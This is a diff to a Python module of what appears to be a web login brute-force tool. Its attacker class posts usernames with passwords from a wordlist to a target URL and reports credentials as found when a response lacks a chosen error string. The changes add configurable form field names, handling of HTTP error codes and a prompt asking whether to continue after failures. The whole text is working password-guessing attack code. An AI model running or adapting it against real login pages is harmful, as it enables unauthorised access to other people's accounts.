@@ -1,4 +1,5 @@
 import requests
+from Modules.Utilities import utilities
 
 class colors:
     HEADER = '\033[95m'
@@ -27,9 +28,11 @@ class attacker:
         attacker.proxylist = [(line.strip()).split() for line in b_file]
         b_file.close()
 
-    def attack(self, target, username, wordlist, proxylist, errIdentfier):
-        # set us a simple found flag
+    def attack(self, target, username, wordlist, proxylist, errIdentfier, usernameParameterName, passwordParameterName):
+        # set us some flags and counters
         creds_found = False
+        badResponse_counter = 0
+        wantsContinue = False
 
         # firstly, let's generate some dicts AND error handle this process, since this is very fishy
         try:
@@ -45,14 +48,15 @@ class attacker:
                     try:
                         print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Executing attack, we'll let you know if we find something..." + colors.ENDC)
                         for currentPwdNum in range(0, len(attacker.wordlist)):
-                            currentPOSTobj = {"username": username, "password": attacker.wordlist[currentPwdNum]}
+                            password = attacker.wordlist[currentPwdNum]
+                            currentPOSTobj = {usernameParameterName: username, passwordParameterName: password}
                             currentRequest = requests.post(target, data = currentPOSTobj)
 
                             # request sent, let's evalute the response
                             currentResponse__text = currentRequest.text
                             currentResponse__code = currentRequest.status_code
 
-                            if currentResponse__text.find(errIdentfier) == -1:
+                            if currentResponse__text.find(errIdentfier) == -1 and currentResponse__code < 400:
                                 # YAY! we have got the creds, user will be happy!
                                 # set a flag
                                 creds_found = True
@@ -70,13 +74,41 @@ class attacker:
                                     print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Please make sure that everything is set up correctly, especially error_identifier." + colors.ENDC)
                                 # end loop
                                 break
+                            elif currentResponse__code >= 400:
+                                # something is wrong, try again and increase the counter or print out the error message
+                                if badResponse_counter > 2 and wantsContinue == False:
+                                    # 3 tries were made, stop a loop, reset counter and ash the user if he wants to continue even that there is unsuccessful connection with server
+                                    print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Connection with webserver was unsuccessful, getting " + colors.BOLD + str(currentResponse__code) + colors.ENDC + colors.FAIL + " error code.")
+                                    if utilities.Question(0, "Do you want to continue and complete trying the whole wordlist, even that we're receiving error code?"):
+                                        # user responded yes, set a wantsContinue flag to true and continue in loop
+                                        print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Copy that. Finishing trying the whole wordlist. Error codes will be ignored." + colors.ENDC)
+                                        wantsContinue = True
+                                        badResponse_counter = 0
+                                        continue 
+                                    else:
+                                        # user responded no, end a loop
+                                        badResponse_counter = 0
+                                        print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "OK. Ending the main loop. Try to check if target parameter is set up correctly." + colors.ENDC)
+                                        return 0
+                                        break                                
+                                elif wantsContinue == False:
+                                    # we're still trying, increase the counter and print out an info
+                                    print(colors.OKCYAN + "[" + colors.WARNING + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "] " + colors.ENDC + colors.WARNING + "Recived error code " + colors.BOLD + str(currentResponse__code) + colors.ENDC + colors.WARNING + ". Trying again..." + colors.ENDC)
+                                    badResponse_counter = badResponse_counter + 1
+                                    continue
                             else:
                                 # this request was unsuccessfull, continue in loop
                                 continue
+                        
+                        # reset some flags and counters
+                        wantsContinue = False
 
                         # if for was unsuccessful and the creds weren't found, print this
                         if not creds_found:
                             print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "\u2717" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Credentials were not found in wordlist, we're sorry :(" + colors.ENDC)
+                        else:
+                            # creds were found, reset the flag, so we will not glitch afterwards
+                            creds_found = False                   
                     except:
                         print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "There was an unexpected error in main loop, please make sure that everything is set up correctly" + colors.ENDC)
                 else:
